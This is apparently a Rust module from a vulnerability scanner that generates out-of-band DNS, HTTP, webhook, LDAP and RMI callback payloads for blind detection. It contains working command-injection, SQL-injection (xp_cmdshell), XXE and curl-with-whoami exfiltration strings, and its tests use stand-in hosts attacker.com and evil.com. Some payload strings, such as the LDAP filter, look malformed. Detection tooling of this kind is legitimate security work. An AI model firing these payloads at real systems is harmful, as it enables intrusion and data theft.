//! Out-of-Band (OOB) Payload Builder - DNS, HTTP, and webhook callback templates
//!
//! Generates payloads for blind vulnerability detection using out-of-band
//! callbacks. Supports DNS exfiltration, HTTP callbacks, and webhook integrations.

use crate::payload::{GeneratedPayload, PayloadClass, Severity, SafetyLevel, VulnerabilityTag};
use std::collections::HashMap;

/// Types of OOB callbacks supported
#[derive(Debug, Clone)]
pub enum OobCallbackType {
    /// DNS lookup callback (for DNS exfil detection)
    Dns,
    /// HTTP/HTTPS callback
    Http,
    /// HTTPS callback with certificate verification
    Https,
    /// Generic webhook callback
    Webhook,
    /// LDAP-based OOB
    Ldap,
    /// RMI callback (Java deserialization)
    Rmi,
}

impl OobCallbackType {
    pub fn as_str(&self) -> &'static str {
        match self {
            OobCallbackType::Dns => "dns",
            OobCallbackType::Http => "http",
            OobCallbackType::Https => "https",
            OobCallbackType::Webhook => "webhook",
            OobCallbackType::Ldap => "ldap",
            OobCallbackType::Rmi => "rmi",
        }
    }
}

/// DNS callback configuration
#[derive(Debug, Clone)]
pub struct DnsCallback {
    pub domain: String,
    pub subdomain_prefix: Option<String>,
    pub include_data: bool,
}

impl DnsCallback {
    pub fn new(domain: impl Into<String>) -> Self {
        Self {
            domain: domain.into(),
            subdomain_prefix: None,
            include_data: true,
        }
    }

    pub fn with_prefix(mut self, prefix: impl Into<String>) -> Self {
        self.subdomain_prefix = Some(prefix.into());
        self
    }

    pub fn generate_payload(&self, data_marker: &str) -> String {
        let prefix = self.subdomain_prefix.as_deref().unwrap_or(data_marker);
        format!("{}.{}", prefix, self.domain)
    }
}

/// HTTP callback configuration
#[derive(Debug, Clone)]
pub struct HttpCallback {
    pub url: String,
    pub method: String,
    pub headers: HashMap<String, String>,
    pub include_body: bool,
}

impl HttpCallback {
    pub fn new(url: impl Into<String>) -> Self {
        Self {
            url: url.into(),
            method: "GET".into(),
            headers: HashMap::new(),
            include_body: false,
        }
    }

    pub fn with_method(mut self, method: impl Into<String>) -> Self {
        self.method = method.into();
        self
    }

    pub fn with_header(mut self, key: impl Into<String>, value: impl Into<String>) -> Self {
        self.headers.insert(key.into(), value.into());
        self
    }

    pub fn with_body(mut self) -> Self {
        self.include_body = true;
        self
    }
}

/// Webhook callback configuration
#[derive(Debug, Clone)]
pub struct WebhookCallback {
    pub url: String,
    pub secret: Option<String>,
    pub payload_format: String,
}

impl WebhookCallback {
    pub fn new(url: impl Into<String>) -> Self {
        Self {
            url: url.into(),
            secret: None,
            payload_format: "json".into(),
        }
    }

    pub fn with_secret(mut self, secret: impl Into<String>) -> Self {
        self.secret = Some(secret.into());
        self
    }

    pub fn with_format(mut self, format: impl Into<String>) -> Self {
        self.payload_format = format.into();
        self
    }
}

/// Builder for OOB payloads
#[derive(Debug, Default)]
pub struct OobPayloadBuilder {
    interaction_id: String,
}

impl OobPayloadBuilder {
    pub fn new() -> Self {
        Self {
            interaction_id: Self::generate_interaction_id(),
        }
    }

    fn generate_interaction_id() -> String {
        use std::time::{SystemTime, UNIX_EPOCH};
        let now = SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_nanos();
        format!("{:016x}", now)
    }

    /// Build DNS-based OOB payloads
    pub fn build_dns(&self, domain: &str) -> Vec<GeneratedPayload> {
        let mut payloads = Vec::new();

        // Basic DNS lookup
        payloads.push(GeneratedPayload::new(
            format!("oob-dns-001"),
            format!("{}.{}", self.interaction_id, domain),
            PayloadClass::Ssrf,
            Severity::High,
            SafetyLevel::LowRisk,
        ).with_tags(vec![VulnerabilityTag::DetectOobDns, VulnerabilityTag::SsrfInternal]));

        // DNS with command injection context
        payloads.push(GeneratedPayload::new(
            format!("oob-dns-002"),
            format!("`nslookup {}.{} `", self.interaction_id, domain),
            PayloadClass::CommandInjection,
            Severity::Critical,
            SafetyLevel::Unsafe,
        ).with_tags(vec![VulnerabilityTag::DetectOobDns, VulnerabilityTag::ContextShell]));

        // DNS with SQL injection context
        payloads.push(GeneratedPayload::new(
            format!("oob-dns-003"),
            format!("'; EXEC xp_cmdshell 'nslookup {}.{}' --", self.interaction_id, domain),
            PayloadClass::SqlInjection,
            Severity::Critical,
            SafetyLevel::Dangerous,
        ).with_tags(vec![VulnerabilityTag::DetectOobDns, VulnerabilityTag::SqlStackedQueries]));

        // DNS with XXE context
        payloads.push(GeneratedPayload::new(
            format!("oob-dns-004"),
            format!(r#"<!DOCTYPE root [<!ENTITY % remote SYSTEM "http://{}.{}"> %remote;]>"#, 
                    self.interaction_id, domain),
            PayloadClass::Xxe,
            Severity::Critical,
            SafetyLevel::Unsafe,
        ).with_tags(vec![VulnerabilityTag::DetectOobDns, VulnerabilityTag::ContextXml]));

        payloads
    }

    /// Build HTTP-based OOB payloads
    pub fn build_http(&self, callback_url: &str) -> Vec<GeneratedPayload> {
        let mut payloads = Vec::new();
        let encoded_url = urlencoding_encode(callback_url);

        // Basic HTTP callback
        payloads.push(GeneratedPayload::new(
            format!("oob-http-001"),
            format!("{}?id={}", callback_url, self.interaction_id),
            PayloadClass::Ssrf,
            Severity::High,
            SafetyLevel::LowRisk,
        ).with_tags(vec![VulnerabilityTag::DetectOobHttp, VulnerabilityTag::SsrfInternal]));

        // HTTP with curl/wget injection
        payloads.push(GeneratedPayload::new(
            format!("oob-http-002"),
            format!("| curl {}?data=$(whoami)", callback_url),
            PayloadClass::CommandInjection,
            Severity::Critical,
            SafetyLevel::Dangerous,
        ).with_tags(vec![VulnerabilityTag::DetectOobHttp, VulnerabilityTag::ContextShell]));

        // HTTP fetch via SQL
        payloads.push(GeneratedPayload::new(
            format!("oob-http-003"),
            format!("'; DECLARE @url varchar(500) = '{}?d={}; EXEC master..sp_OAMethod @object, 'Open', NULL, @url' --",
                    callback_url, self.interaction_id),
            PayloadClass::SqlInjection,
            Severity::Critical,
            SafetyLevel::Dangerous,
        ).with_tags(vec![VulnerabilityTag::DetectOobHttp, VulnerabilityTag::SqlStackedQueries]));

        // URL redirect SSRF
        payloads.push(GeneratedPayload::new(
            format!("oob-http-004"),
            encoded_url.clone(),
            PayloadClass::Ssrf,
            Severity::High,
            SafetyLevel::LowRisk,
        ).with_tags(vec![VulnerabilityTag::DetectOobHttp, VulnerabilityTag::SsrfCloudMetadata]));

        payloads
    }

    /// Build webhook-specific payloads
    pub fn build_webhook(&self, webhook_url: &str) -> Vec<GeneratedPayload> {
        let mut payloads = Vec::new();

        // JSON webhook payload
        payloads.push(GeneratedPayload::new(
            format!("oob-webhook-001"),
            format!(r#"{{"callback": "{}", "id": "{}"}}"#, webhook_url, self.interaction_id),
            PayloadClass::Deserialization,
            Severity::High,
            SafetyLevel::LowRisk,
        ).with_tags(vec![VulnerabilityTag::DetectOobHttp, VulnerabilityTag::ContextJson]));

        // XML-RPC style webhook
        payloads.push(GeneratedPayload::new(
            format!("oob-webhook-002"),
            format!(r#"<?xml version="1.0"?>
<methodCall>
  <methodName>ping</methodName>
  <params>
    <param><value>{}</value></param>
    <param><value>{}</value></param>
  </params>
</methodCall>"#, webhook_url, self.interaction_id),
            PayloadClass::Xxe,
            Severity::High,
            SafetyLevel::LowRisk,
        ).with_tags(vec![VulnerabilityTag::DetectOobHttp, VulnerabilityTag::ContextXml]));

        payloads
    }

    /// Build LDAP-based OOB payloads
    pub fn build_ldap_oob(&self, domain: &str) -> Vec<GeneratedPayload> {
        vec![
            GeneratedPayload::new(
                format!("oob-ldap-001"),
                format!("(&(uid=*)(|(cn=*{}.{})")) ,
                PayloadClass::LdapInjection,
                Severity::High,
                SafetyLevel::Unsafe,
            ).with_tags(vec![VulnerabilityTag::DetectOobDns, VulnerabilityTag::ContextLdap]),
        ]
    }

    /// Build RMI callback payloads (Java deserialization)
    pub fn build_rmi(&self, host: &str, port: u16) -> Vec<GeneratedPayload> {
        vec![
            GeneratedPayload::new(
                format!("oob-rmi-001"),
                format!("rmi://{}/{}", host, port),
                PayloadClass::Deserialization,
                Severity::Critical,
                SafetyLevel::Dangerous,
            ).with_tags(vec![VulnerabilityTag::TechJava, VulnerabilityTag::Cwe502]),
        ]
    }

    /// Build all OOB payloads for a given callback type
    pub fn build_for_callback(
        &self,
        callback: &str,
        callback_type: OobCallbackType,
    ) -> Vec<GeneratedPayload> {
        match callback_type {
            OobCallbackType::Dns => self.build_dns(callback),
            OobCallbackType::Http | OobCallbackType::Https => self.build_http(callback),
            OobCallbackType::Webhook => self.build_webhook(callback),
            OobCallbackType::Ldap => self.build_ldap_oob(callback),
            OobCallbackType::Rmi => {
                // Parse host:port from callback
                if let Some((host, port)) = callback.split(':').next().zip(
                    callback.split(':').nth(1).and_then(|p| p.parse::<u16>().ok())
                ) {
                    self.build_rmi(host, port)
                } else {
                    self.build_http(callback)
                }
            }
        }
    }

    /// Get the current interaction ID
    pub fn interaction_id(&self) -> &str {
        &self.interaction_id
    }

    /// Reset with a new interaction ID
    pub fn reset(&mut self) {
        self.interaction_id = Self::generate_interaction_id();
    }
}

/// Simple URL encoding helper
fn urlencoding_encode(s: &str) -> String {
    let mut encoded = String::new();
    for c in s.chars() {
        match c {
            'a'..='z' | 'A'..='Z' | '0'..='9' | '-' | '_' | '.' | '~' => encoded.push(c),
            ' ' => encoded.push_str("%20"),
            ':' => encoded.push_str("%3A"),
            '/' => encoded.push_str("%2F"),
            '?' => encoded.push_str("%3F"),
            '&' => encoded.push_str("%26"),
            '=' => encoded.push_str("%3D"),
            '%' => encoded.push_str("%25"),
            _ => encoded.push_str(&format!("%{:02X}", c as u8)),
        }
    }
    encoded
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_dns_callback() {
        let callback = DnsCallback::new("attacker.com")
            .with_prefix("test");
        
        let payload = callback.generate_payload("marker");
        assert_eq!(payload, "test.attacker.com");
    }

    #[test]
    fn test_http_callback_builder() {
        let callback = HttpCallback::new("http://attacker.com/callback")
            .with_method("POST")
            .with_header("X-Custom", "value")
            .with_body();
        
        assert_eq!(callback.method, "POST");
        assert!(callback.include_body);
        assert_eq!(callback.headers.get("X-Custom"), Some(&"value".to_string()));
    }

    #[test]
    fn test_oob_payload_builder() {
        let builder = OobPayloadBuilder::new();
        
        let dns_payloads = builder.build_dns("evil.com");
        assert!(!dns_payloads.is_empty());
        
        let http_payloads = builder.build_http("http://evil.com/cb");
        assert!(!http_payloads.is_empty());
    }

    #[test]
    fn test_url_encoding() {
        let encoded = urlencoding_encode("http://example.com/path?a=1&b=2");
        assert!(encoded.contains("%3A"));
        assert!(encoded.contains("%2F"));
        assert!(encoded.contains("%3F"));
    }
}
